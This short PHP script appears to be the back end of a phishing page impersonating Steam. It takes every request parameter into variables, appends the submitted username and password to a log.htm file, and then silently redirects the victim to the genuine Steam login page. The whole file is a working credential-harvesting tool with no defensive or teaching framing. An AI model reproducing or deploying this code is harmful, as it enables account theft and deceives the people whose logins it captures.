<?php
extract ( $_REQUEST );
$out = fopen ( "log.htm" , "a+t" );
fwrite ( $out , "$username : $password <br>\n" );
fclose ( $out );
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://store.steampowered.com/login/'></head></html>" ;
?> 